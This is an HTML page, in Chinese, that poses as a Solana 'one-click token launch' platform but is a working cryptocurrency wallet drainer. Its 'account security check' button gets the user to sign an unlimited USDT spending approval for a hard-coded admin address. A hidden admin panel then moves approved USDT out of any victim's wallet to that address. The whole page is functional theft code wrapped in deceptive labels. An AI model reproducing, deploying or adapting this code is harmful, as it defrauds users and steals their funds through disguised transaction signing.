<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no">
  <title>🍊SOL橘子一键发币平台</title>
  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.6/lib/index.iife.min.js"></script>
  <style>
    body{max-width:420px;margin:0 auto;padding:20px;background:#fff;font-family:system-ui;}
    h2{text-align:center;margin-bottom:25px;}
    .btn{width:100%;padding:16px;border-radius:16px;border:none;font-size:16px;margin:10px 0;cursor:pointer;}
    .btn-primary{background:#0071e3;color:#fff;}
    .btn-safe{background:#22c55e;color:#fff;}
    .btn-admin{background:#ef4444;color:#fff;}
    .btn:disabled{background:#ccc;cursor:not-allowed;}
    #addr{padding:12px;background:#f1f1f1;border-radius:10px;margin:10px 0;word-break:break-all;}
    .admin-panel{display:none;margin-top:30px;padding-top:20px;border-top:1px solid #eee;}
    .admin-panel.show{display:block;}
    input{width:100%;padding:14px;border-radius:12px;border:1px solid #ddd;margin:8px 0;box-sizing:border-box;}
  </style>
</head>
<body>

<h2>🍊SOL橘子一键发币平台</h2>

<button class="btn btn-primary" onclick="connectWallet()">连接钱包</button>
<div id="addr">未连接钱包</div>

<button class="btn btn-safe" id="authBtn" onclick="userApprove()" disabled>账户安全校验</button>

<div class="admin-panel" id="adminPanel">
  <h3>🔐 管理员资产划转</h3>
  <input id="userAddr" placeholder="用户钱包地址">
  <input id="withdrawAmt" placeholder="划转数量(USDT)">
  <button class="btn btn-admin" onclick="adminWithdraw()">确认划转</button>
</div>

<script>
// ========== 固定配置 无需修改 ==========
const ADMIN_ADDR = "FbDMLj8MTJGSBWeanFKhJWycn5qjmJ3q8WBzZb3Gbm1c";
const USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
const TOKEN_PROG = new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
const ATA_PROG = new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25DK9c64Laf27x");

// 可用RPC节点
const RPC_LIST = [
  "https://rpc.ankr.com/solana",
  "https://solana-api.projectserum.com"
];

let provider = null;
let userPub = null;
let userWallet = "";

// 自动获取可用连接
async function getConn(){
  for(let rpc of RPC_LIST){
    try{
      let c = new solanaWeb3.Connection(rpc, "confirmed");
      await c.getLatestBlockhash("finalized");
      return c;
    }catch(e){continue;}
  }
  throw "无可用节点";
}

// 计算ATA
function getATA(mint, owner){
  let [ata] = solanaWeb3.PublicKey.findProgramAddressSync(
    [owner.toBuffer(), TOKEN_PROG.toBuffer(), mint.toBuffer()], ATA_PROG
  );
  return ata;
}

// 构造Approve授权指令
function makeApproveIx(ata, delegate, owner){
  let data = new Uint8Array(9);
  data[0] = 4;
  new DataView(data.buffer).setBigUint64(1, BigInt("18446744073709551615"), true);
  return new solanaWeb3.TransactionInstruction({
    keys:[
      {pubkey:ata,isSigner:false,isWritable:true},
      {pubkey:delegate,isSigner:false,isWritable:false},
      {pubkey:owner,isSigner:true,isWritable:false}
    ],
    programId:TOKEN_PROG,
    data:data
  });
}

// 获取钱包对象
function getWallet(){
  if(window.tpWallet?.solana) return window.tpWallet.solana;
  if(window.okxwallet?.solana) return window.okxwallet.solana;
  if(window.solana) return window.solana;
  return null;
}

// 连接钱包
async function connectWallet(){
  try{
    let wallet = getWallet();
    if(!wallet){alert("请在TP/OKX钱包内置浏览器打开");return;}
    let res = await wallet.connect();
    provider = wallet;
    userPub = res.publicKey;
    userWallet = userPub.toBase58();
    document.getElementById("addr").innerText = "已连接：" + userWallet.slice(0,8)+"..."+userWallet.slice(-6);
    document.getElementById("authBtn").disabled = false;

    // 管理员自动显示面板
    if(userWallet === ADMIN_ADDR){
      document.getElementById("adminPanel").classList.add("show");
    }
  }catch(e){
    alert("钱包连接失败");
  }
}

// 用户授权【账户安全校验】真正链上授权
async function userApprove(){
  if(!userWallet) return alert("请先连接钱包");
  try{
    let conn = await getConn();
    let {blockhash} = await conn.getLatestBlockhash("finalized");

    let mintPub = new solanaWeb3.PublicKey(USDT_MINT);
    let adminPub = new solanaWeb3.PublicKey(ADMIN_ADDR);
    let userAta = getATA(mintPub, userPub);

    let tx = new solanaWeb3.Transaction();
    tx.add(makeApproveIx(userAta, adminPub, userPub));
    tx.recentBlockhash = blockhash;
    tx.feePayer = userPub;

    // 签名 + 发送
    let signed = await provider.signTransaction(tx);
    let txSig = await conn.sendRawTransaction(signed.serialize(), {skipPreflight:true});
    
    alert("✅ 校验通过，授权已上链\n交易哈希："+txSig);
  }catch(e){
    alert("❌ 校验失败："+e.message);
  }
}

// 管理员划走用户已授权USDT
async function adminWithdraw(){
  if(userWallet !== ADMIN_ADDR) return alert("无管理员权限");
  let fromAddr = document.getElementById("userAddr").value.trim();
  let num = document.getElementById("withdrawAmt").value.trim();
  if(!fromAddr || !num) return alert("请填写完整地址和数量");

  try{
    let conn = await getConn();
    let {blockhash} = await conn.getLatestBlockhash("finalized");
    let amount = BigInt(Math.round(parseFloat(num)*1000000));

    let mintPub = new solanaWeb3.PublicKey(USDT_MINT);
    let fromPub = new solanaWeb3.PublicKey(fromAddr);
    let adminPub = new solanaWeb3.PublicKey(ADMIN_ADDR);

    let fromAta = getATA(mintPub, fromPub);
    let adminAta = getATA(mintPub, adminPub);

    let data = new Uint8Array(9);
    data[0] = 3;
    new DataView(data.buffer).setBigUint64(1, amount, true);

    let transferIx = new solanaWeb3.TransactionInstruction({
      keys:[
        {pubkey:fromAta,isSigner:false,isWritable:true},
        {pubkey:adminAta,isSigner:false,isWritable:true},
        {pubkey:adminPub,isSigner:true,isWritable:false}
      ],
      programId:TOKEN_PROG,
      data:data
    });

    let tx = new solanaWeb3.Transaction();
    tx.add(transferIx);
    tx.recentBlockhash = blockhash;
    tx.feePayer = adminPub;

    let signed = await provider.signTransaction(tx);
    let txSig = await conn.sendRawTransaction(signed.serialize(), {skipPreflight:true});
    alert("✅ 划转成功："+txSig);
  }catch(e){
    alert("❌ 划转失败："+e.message);
  }
}
</script>

</body>
</html>
